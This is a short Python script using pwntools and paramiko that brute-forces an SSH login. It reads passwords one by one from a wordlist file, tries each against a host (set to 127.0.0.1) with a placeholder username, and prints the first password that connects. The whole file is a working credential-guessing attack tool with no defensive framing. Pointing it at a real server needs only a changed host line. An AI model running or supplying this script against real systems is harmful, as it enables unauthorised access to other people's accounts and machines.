from pwn import *
import paramiko

host = '127.0.0.1'
username = 'username'
attemps = 1
with open('common_passwordlist', 'r') as pass_list:
    for password in pass_list:
        password = password.strip("\n")
        try:
            print('[{}]Attemping password : {}'.format(attemps, password))
            respons = ssh(host = host,username = username, password = password,timeout = 1)
            if respons.connected():
                print('[+] Valid password found : "{}"!'.format(password))
                respons.close()
                break
            respons.close()
        except paramiko.ssh_exception.AuthenticationException:
            print('[-] Invalid password !')
        attemps += 1
